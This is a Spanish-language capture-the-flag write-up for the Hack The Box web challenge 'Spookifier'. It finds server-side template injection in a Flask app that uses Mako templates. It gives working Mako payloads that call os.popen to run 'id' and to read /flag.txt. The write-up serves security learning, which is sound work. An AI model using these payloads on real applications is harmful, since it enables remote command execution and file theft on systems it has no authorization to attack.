---
title: Spookifier
description: There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?
date: 2025-05-14
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-challenges/web_logo.png
categories:
  - Hack_The_Box
  - Challenges
tags:
  - hack_the_box
  - ssti
  - arbitrary_file_read
  - web_analysis
  - vulnerability_exploitation

---
## Web Analysis

El sitio web proporciona una funcionalidad sencilla, permite ingresar texto que luego es transformado a distintos estilos de fuentes.

![](assets/img/htb-writeup-spookifier/spookifier1.png)

```terminal
/home/kali/Documents/htb/challenges/spookifier:-$ unzip Spookifier.zip 
```

Descomprimo el archivo proporcionado por el reto para analizar su contenido. A simple vista, parece tratarse de la misma web mostrada en la interfaz, y está implementada en Python.

```terminal
/home/kali/Documents/htb/challenges/spookifier:-$ tree web_spookifier 
web_spookifier
├── build-docker.sh
├── challenge
│   ├── application
│   │   ├── blueprints
│   │   │   └── routes.py
│   │   ├── main.py
│   │   ├── static
│   │   │   ├── css
│   │   │   │   ├── index.css
│   │   │   │   └── nes.css
│   │   │   └── images
│   │   │       └── vamp.png
│   │   ├── templates
│   │   │   └── index.html
│   │   └── util.py
│   └── run.py
├── config
│   └── supervisord.conf
├── Dockerfile
└── flag.txt
```

Revisando el Dockerfile, confirmo que el archivo `flag.txt` es copiado directamente al directorio raíz.

```terminal
/home/kali/Documents/htb/challenges/spookifier:-$ cat web_spookifier/Dockerfile 
...snip...
# Copy flag
COPY flag.txt /flag.txt
...snip...
```

El archivo `main.py` sugiere que la aplicación utiliza Mako Templates como motor de plantillas.

```terminal
/home/kali/Documents/htb/challenges/spookifier:-$ head -3 web_spookifier/challenge/application/main.py
from flask import Flask, jsonify
from application.blueprints.routes import web
from flask_mako import MakoTemplates
```

Teniendo en cuenta esto, realizo una prueba de Server-Side Template Injection específica para Mako. El resultado mostrado por la aplicación es 49, lo cual confirma que la presencia de la vulnerabilidad SSTI.

![](assets/img/htb-writeup-spookifier/spookifier2.png)

---
## Vulnerability Exploitation

Consultando [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/996c83bb4ba054261767cf49f6c5b4d582393cf2/Server%20Side%20Template%20Injection#mako), encuentro referencias útiles para construir una cadena capaz de ejecutar comandos arbitrarios utilizando Mako Templates. Mediante el uso de os.popen, logro explotar la vulnerabilidad SSTI y ejecutar comandos del sistema. 

```python
${self.module.cache.util.os.popen('id').read()}
```

![](assets/img/htb-writeup-spookifier/spookifier3.png)

La vulnerabilidad permite la lectura arbitraria de archivos y la ejecución de comandos. A partir de esto, accedo al contenido de la flag alojada en el directorio raíz.

```python
${self.module.cache.util.os.popen('cat /flag.txt').read()}
```

![](assets/img/htb-writeup-spookifier/spookifier4.png)

> <a href="https://labs.hackthebox.com/achievement/challenge/1521382/413" target="_blank">***Litio7 has successfully solved Spookifier from Hack The Box***</a>
{: .prompt-info style="text-align:center" }